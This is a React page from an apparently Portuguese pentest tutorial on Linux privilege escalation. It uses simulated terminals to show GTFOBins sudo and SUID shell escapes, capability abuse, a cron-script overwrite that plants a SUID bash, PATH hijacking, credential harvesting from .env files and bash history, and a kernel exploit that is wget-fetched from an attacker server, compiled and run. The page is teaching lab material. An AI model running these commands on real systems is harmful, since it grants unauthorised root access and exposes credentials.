import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function PrivescLinux() {
  return (
    <PageContainer
      title="PrivEsc — Escalação de privilégio (Linux)"
      subtitle="Você é www-data ou shellguy? Vire root. SUID, sudo NOPASSWD, capabilities, kernel exploits, cron."
      difficulty="intermediario"
      timeToRead="22 min"
    >
      <h2>Recon obrigatório</h2>
      <Terminal
        user="www-data"
        host="target"
        path="/var/www/html"
        lines={[
          {
            cmd: "id",
            out: "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
            outType: "info",
          },
          {
            cmd: "uname -a",
            out: "Linux target 5.15.0-83-generic #92-Ubuntu SMP Mon Aug 14 09:30:42 UTC 2023 x86_64 GNU/Linux",
            outType: "default",
          },
          {
            cmd: "cat /etc/os-release | head -3",
            out: `PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"`,
            outType: "default",
          },
          {
            cmd: "hostname",
            out: "target.lab.local",
            outType: "muted",
          },
          {
            cmd: "ip a | grep inet | head -3",
            out: `    inet 127.0.0.1/8 scope host lo
    inet 192.168.1.50/24 brd 192.168.1.255 scope global eth0
    inet 10.10.10.5/24 brd 10.10.10.255 scope global eth1`,
            outType: "default",
          },
        ]}
      />

      <h2>Automação — linPEAS / linenum</h2>
      <Terminal
        user="www-data"
        host="target"
        path="/tmp"
        lines={[
          {
            comment: "do atacante: subir um servidor para baixar tools",
            cmd: "(no atacante) python3 -m http.server 8000",
            out: "Serving HTTP on 0.0.0.0 port 8000 ...",
            outType: "muted",
          },
          {
            cmd: "wget http://10.10.14.42:8000/linpeas.sh && chmod +x linpeas.sh",
            out: "linpeas.sh saved (842 KB)",
            outType: "default",
          },
          {
            cmd: "./linpeas.sh -a 2>/dev/null | tee linpeas.txt | grep -E '95%|99%'",
            out: `╔══════════╣ Sudo version
sudo version 1.8.31

[!] CVE-2021-3156 vulnerable to sudo Baron Samedit (95%) ← privesc!
[!] CVE-2021-4034 (PwnKit) (99%)                          ← privesc!

╔══════════╣ SUID
-rwsr-xr-x 1 root root 87768 /usr/bin/sudo
-rwsr-xr-x 1 root root 35192 /usr/bin/su
[!] /usr/bin/find  ← SUID + GTFOBins!  (95%)
[!] /usr/bin/python3.10  ← SUID + GTFOBins!  (95%)`,
            outType: "warning",
          },
        ]}
      />

      <h2>Vetor 1 — sudo NOPASSWD em comando exploitável</h2>
      <Terminal
        user="www-data"
        host="target"
        path="/tmp"
        lines={[
          {
            cmd: "sudo -l",
            out: `Matching Defaults entries for www-data on target:
    env_reset, mail_badpass

User www-data may run the following commands on target:
    (root) NOPASSWD: /usr/bin/find`,
            outType: "warning",
          },
          {
            comment: "CONSULTE GTFOBins PRIMEIRO: gtfobins.github.io/gtfobins/find/#sudo",
            cmd: "sudo find /tmp -exec /bin/sh -p \\; -quit",
            out: `# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
root`,
            outType: "error",
          },
        ]}
      />

      <CommandTable
        title="GTFOBins — comandos comuns que viram root via sudo"
        variations={[
          { cmd: "vim", desc: "sudo vim -c ':!sh'", output: "Spawn shell de root." },
          { cmd: "less / more", desc: "sudo less /etc/profile → !sh", output: "Mesmo princípio." },
          { cmd: "find", desc: "sudo find . -exec /bin/sh \\;", output: "" },
          { cmd: "awk", desc: "sudo awk 'BEGIN {system(\"/bin/sh\")}'", output: "" },
          { cmd: "tar", desc: "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", output: "" },
          { cmd: "nmap (legacy)", desc: "sudo nmap --interactive → !sh", output: "Antigo (<5.21)." },
          { cmd: "perl / python / ruby", desc: "sudo python3 -c 'import os; os.system(\"/bin/sh\")'", output: "" },
          { cmd: "git", desc: "sudo git -p help log → !sh", output: "" },
          { cmd: "wget", desc: "sudo wget --use-askpass=/path/sh.sh", output: "Plant sh.sh script malicioso." },
          { cmd: "tcpdump", desc: "sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/sh.sh", output: "Executa sh.sh com privs root." },
        ]}
      />

      <h2>Vetor 2 — SUID binaries</h2>
      <Terminal
        user="www-data"
        host="target"
        path="/tmp"
        lines={[
          {
            cmd: "find / -perm -4000 -type f 2>/dev/null",
            out: `/usr/bin/passwd
/usr/bin/sudo
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/find       ← suspeito!
/usr/bin/python3.10 ← MUITO suspeito!`,
            outType: "warning",
          },
          {
            comment: "python3 com SUID = root via os.execl",
            cmd: "/usr/bin/python3.10 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            out: `# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)`,
            outType: "error",
          },
        ]}
      />

      <h2>Vetor 3 — capabilities</h2>
      <Terminal
        user="www-data"
        host="target"
        path="/tmp"
        lines={[
          {
            cmd: "getcap -r / 2>/dev/null",
            out: `/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/python3.10 cap_setuid+ep    ← RCE para root!
/usr/bin/perl cap_setuid+ep`,
            outType: "warning",
          },
          {
            cmd: "/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
            out: `# id
uid=0(root) gid=33(www-data) groups=33(www-data)`,
            outType: "error",
          },
        ]}
      />

      <h2>Vetor 4 — cron jobs writable</h2>
      <Terminal
        user="www-data"
        host="target"
        path="/tmp"
        lines={[
          {
            cmd: "cat /etc/crontab",
            out: `SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
*  *    * * *   root    /usr/local/bin/backup.sh   ← roda como ROOT a cada minuto!`,
            outType: "warning",
          },
          {
            cmd: "ls -la /usr/local/bin/backup.sh",
            out: "-rwxrwxrwx 1 root root 142 Mar 12 14:23 /usr/local/bin/backup.sh    ← world-writable!",
            outType: "error",
          },
          {
            cmd: "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /usr/local/bin/backup.sh",
            out: "(silencioso. agora espera 1 minuto)",
            outType: "default",
          },
          {
            cmd: "sleep 70 && ls -la /tmp/rootbash",
            out: "-rwsr-sr-x 1 root root 1396520 Apr  3 15:42 /tmp/rootbash",
            outType: "warning",
          },
          {
            cmd: "/tmp/rootbash -p",
            out: `# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)`,
            outType: "error",
          },
        ]}
      />

      <h2>Vetor 5 — PATH hijacking</h2>
      <Terminal
        user="www-data"
        host="target"
        path="/tmp"
        lines={[
          {
            comment: "binário SUID que chama 'ps' SEM caminho absoluto",
            cmd: "strings /usr/local/bin/checker | grep -E 'system|exec'",
            out: `system
system("ps aux | grep mysql")`,
            outType: "warning",
          },
          {
            cmd: "ls -la /usr/local/bin/checker",
            out: "-rwsr-xr-x 1 root root 16624 Mar 12 14:23 /usr/local/bin/checker",
            outType: "info",
          },
          {
            comment: "criar 'ps' falso e por antes no PATH",
            cmd: "echo -e '#!/bin/sh\\n/bin/sh -p' > /tmp/ps && chmod +x /tmp/ps",
            out: "",
            outType: "muted",
          },
          {
            cmd: "PATH=/tmp:$PATH /usr/local/bin/checker",
            out: `# id
uid=33(www-data) euid=0(root)`,
            outType: "error",
          },
        ]}
      />

      <h2>Vetor 6 — kernel exploits</h2>
      <Terminal
        user="www-data"
        host="target"
        path="/tmp"
        lines={[
          {
            cmd: "uname -r",
            out: "5.15.0-83-generic",
            outType: "info",
          },
          {
            comment: "do atacante",
            cmd: "(local) searchsploit linux kernel 5.15",
            out: `Linux Kernel 5.15.0-46 (Ubuntu) - 'GameOverlay' Local Privilege Escalation | linux/local/51817.c
Linux Kernel 6.2 (Ubuntu) - 'GameOverlay' Local Privilege Escalation         | linux/local/51932.c`,
            outType: "warning",
          },
          {
            cmd: "(local) searchsploit -m 51817",
            out: "Copied to: ./51817.c",
            outType: "muted",
          },
          {
            comment: "transferir + compilar no alvo",
            cmd: "wget http://10.10.14.42:8000/51817.c && gcc -o pwn 51817.c && ./pwn",
            out: `[*] Triggering CVE-2023-2640
[+] Got root!
# id
uid=0(root) gid=0(root) groups=0(root)`,
            outType: "error",
          },
        ]}
      />

      <h2>CVEs recentes mais usados (Linux)</h2>
      <CommandTable
        title="Hall da fama"
        variations={[
          { cmd: "CVE-2021-4034 (PwnKit)", desc: "polkit pkexec — ANY user → root.", output: "Funciona até hoje em sistemas sem patch. Quase 100% confiável." },
          { cmd: "CVE-2021-3156 (Baron Samedit)", desc: "sudo heap overflow.", output: "sudo < 1.9.5p2 → root." },
          { cmd: "CVE-2022-0847 (DirtyPipe)", desc: "Pipe → escrita arbitrária em arquivos read-only.", output: "Kernel 5.8 - 5.16.10. Sobrescreve /etc/passwd." },
          { cmd: "CVE-2023-0386 (OverlayFS)", desc: "Overlay filesystem privesc.", output: "Containers vulneráveis. Kernel < 6.2." },
          { cmd: "CVE-2023-2640 (GameOverlay)", desc: "OverlayFS Ubuntu.", output: "Específico Ubuntu 22.04 / 23.04." },
          { cmd: "CVE-2024-1086 (nf_tables)", desc: "Use-after-free em netfilter.", output: "Kernel 5.14 - 6.6 → root." },
        ]}
      />

      <h2>Vetor 7 — credenciais em arquivos</h2>
      <Terminal
        user="www-data"
        host="target"
        path="/var/www/html"
        lines={[
          {
            cmd: "grep -ri 'password' . 2>/dev/null | head -5",
            out: `./config/database.php:    'password' => 'Senha@DB123',
./.env:DB_PASSWORD=Senha@DB123
./.env:ADMIN_PASSWORD=Adm!n2024
./includes/config.inc.php:    \\$db_password = 'Senha@DB123';`,
            outType: "warning",
          },
          {
            cmd: "find / -name '*.bak' -o -name '*.old' -o -name '.env*' 2>/dev/null | head",
            out: `/var/backups/passwd.bak
/var/backups/shadow.bak
/var/www/html/.env
/var/www/html/wp-config.php.bak
/home/admin/.bash_history`,
            outType: "info",
          },
          {
            comment: "history sempre tem coisa boa",
            cmd: "cat /home/admin/.bash_history",
            out: `cd /var/www
sudo nano /etc/mysql/my.cnf
mysql -u root -p'R00tDB!2024'
ssh wallyson@10.10.10.42
cat /root/api_key.txt
exit`,
            outType: "error",
          },
        ]}
      />

      <CodeBlock
        language="bash"
        title="checklist privesc Linux (recomendado memorizar)"
        code={`# 1. Quem sou eu?
id; groups; sudo -l

# 2. Sistema
uname -a; cat /etc/os-release; hostnamectl

# 3. SUID / SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# 4. Capabilities
getcap -r / 2>/dev/null

# 5. Cron
cat /etc/crontab; ls -la /etc/cron.*; crontab -l

# 6. Writable em PATH / system
find / -perm -o+w -type f 2>/dev/null | grep -v '/proc\\|/sys'
find / -perm -o+w -type d 2>/dev/null | grep -v '/tmp\\|/var\\|/proc'

# 7. Configs e creds
grep -rEn 'password|secret|api_key|token' /var/www/ /home/ /opt/ 2>/dev/null | head
find / -name '.env*' -o -name 'wp-config*' -o -name '*.bak' 2>/dev/null

# 8. Procs interessantes
ps aux | grep -v 'grep' | grep -E 'root|0:0'

# 9. Ambiente
env; cat ~/.bashrc; cat ~/.bash_history

# 10. Network
ss -tulpn; ip route; arp -a

# 11. Kernel exploit
uname -r       # → searchsploit no atacante`}
      />

      <PracticeBox
        title="Lab clássico — VulnHub Mr-Robot"
        goal="Praticar privesc completo: shell de daemon → root."
        steps={[
          "Suba uma VM como Mr-Robot do VulnHub.",
          "Após shell inicial (ex: como daemon), rode linpeas.",
          "Identifique nmap SUID com versão antiga.",
          "Use o vetor --interactive do nmap antigo.",
          "Confirme acesso root.",
        ]}
        command={`# DENTRO DA SHELL DO ALVO:
wget http://atacante:8000/linpeas.sh && chmod +x linpeas.sh
./linpeas.sh -a > /tmp/linpeas.txt 2>/dev/null

# achou: /usr/local/bin/nmap (versão 3.81 — antiga!)
nmap --interactive
nmap> !sh
# id
uid=0(root) gid=0(root)`}
        expected={`/usr/local/bin/nmap (versão 3.81 — antiga!)
[+] SUID + nmap interactive shell

nmap> !sh
sh-3.2# id
uid=0(root) gid=0(root) groups=0(root)`}
        verify="No final: cat /root/key-3-of-3.txt para confirmar a flag root."
      />

      <AlertBox type="warning" title="GTFOBins é o seu manual">
        <a href="https://gtfobins.github.io" target="_blank" rel="noreferrer">gtfobins.github.io</a> lista
        TODO binário Unix que pode ser abusado via SUID, sudo, capabilities, file write, etc.
        Memorize como usar. Para Windows: <a href="https://lolbas-project.github.io" target="_blank" rel="noreferrer">lolbas-project.github.io</a>.
      </AlertBox>
    </PageContainer>
  );
}
